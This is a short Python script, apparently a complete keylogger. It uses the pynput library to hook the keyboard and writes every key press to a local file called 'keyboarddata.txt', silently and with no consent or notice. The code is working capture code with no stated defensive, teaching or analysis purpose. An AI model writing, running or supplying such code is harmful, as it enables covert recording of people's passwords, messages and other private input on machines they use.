import logging
from pynput import keyboard

text = ""
logging.basicConfig(filename=f"{text}keyboarddata.txt", level=logging.DEBUG, format="%(message)s")

def on_press(key):
    logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join() 